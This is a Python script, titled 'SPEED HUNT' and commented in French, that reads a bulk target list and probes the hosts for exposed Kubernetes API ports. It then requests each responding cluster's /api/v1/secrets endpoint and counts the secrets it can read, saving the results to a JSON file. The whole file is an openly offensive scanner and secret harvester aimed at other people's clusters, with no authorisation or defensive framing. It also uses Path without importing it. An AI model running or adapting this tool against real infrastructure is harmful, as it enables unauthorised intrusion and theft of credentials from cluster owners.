#!/usr/bin/env python3
"""
⚡ SPEED HUNT - Résultats en 5 minutes max
"""

import asyncio
import aiohttp
import time
from datetime import datetime

class SpeedHunt:
    def __init__(self):
        self.results = {
            "clusters_found": 0,
            "vulnerabilities": 0,
            "secrets": 0,
            "start_time": datetime.now()
        }
    
    async def quick_k8s_scan(self, targets):
        """Scan K8s ultra-rapide"""
        print("🔍 Scan K8s rapide en cours...")
        
        common_ports = [6443, 8443, 10250, 8080]
        vulnerable_endpoints = []
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=3)) as session:
            for target in targets[:50]:  # Limiter pour rapidité
                for port in common_ports:
                    try:
                        url = f"http://{target}:{port}/api/v1"
                        async with session.get(url, ssl=False) as response:
                            if response.status in [200, 401, 403]:
                                vulnerable_endpoints.append(f"{target}:{port}")
                                self.results["clusters_found"] += 1
                                print(f"✅ K8s trouvé: {target}:{port}")
                                break
                    except:
                        continue
        
        return vulnerable_endpoints
    
    async def extract_quick_secrets(self, endpoints):
        """Extraction rapide de secrets"""
        print("🔑 Extraction rapide des secrets...")
        
        secrets_found = []
        
        for endpoint in endpoints:
            try:
                # Test accès secrets
                secrets_url = f"http://{endpoint}/api/v1/secrets"
                
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=2)) as session:
                    async with session.get(secrets_url, ssl=False) as response:
                        if response.status == 200:
                            data = await response.json()
                            secrets_count = len(data.get('items', []))
                            if secrets_count > 0:
                                secrets_found.append({
                                    "endpoint": endpoint,
                                    "secrets_count": secrets_count
                                })
                                self.results["secrets"] += secrets_count
                                print(f"🔐 {secrets_count} secrets trouvés sur {endpoint}")
            except:
                continue
        
        return secrets_found
    
    async def run_speed_hunt(self):
        """Hunt rapide 5 minutes"""
        print("""
╔══════════════════════════════════════╗
║        ⚡ SPEED HUNT 5MIN ⚡          ║
║          Résultats Rapides           ║
╚══════════════════════════════════════╝
        """)
        
        # Charger targets
        targets = []
        if Path("targets_massive_optimized.txt").exists():
            with open("targets_massive_optimized.txt", "r") as f:
                targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        else:
            # Targets par défaut pour test
            targets = ["127.0.0.1", "localhost", "192.168.1.1"]
        
        print(f"🎯 {len(targets)} targets chargées")
        
        # Phase 1: Scan rapide
        endpoints = await self.quick_k8s_scan(targets)
        
        # Phase 2: Extraction rapide
        if endpoints:
            secrets = await self.extract_quick_secrets(endpoints)
        
        # Résultats
        duration = datetime.now() - self.results["start_time"]
        
        print(f"""
╔══════════════════════════════════════╗
║           📊 RÉSULTATS RAPIDES       ║
╠══════════════════════════════════════╣
║ 🔍 Clusters trouvés: {self.results['clusters_found']}             ║
║ 🔐 Secrets extraits: {self.results['secrets']}              ║
║ ⏱️  Durée: {duration}          ║
║ 💯 Status: TERMINÉ               ║
╚══════════════════════════════════════╝
        """)
        
        # Sauvegarder résultats
        import json
        results_file = f"speed_hunt_results_{int(time.time())}.json"
        with open(results_file, "w") as f:
            json.dump({
                **self.results,
                "duration": str(duration),
                "endpoints_found": endpoints if 'endpoints' in locals() else [],
                "timestamp": datetime.now().isoformat()
            }, f, indent=2)
        
        print(f"💾 Résultats sauvés: {results_file}")

async def main():
    hunter = SpeedHunt()
    await hunter.run_speed_hunt()

if __name__ == "__main__":
    asyncio.run(main())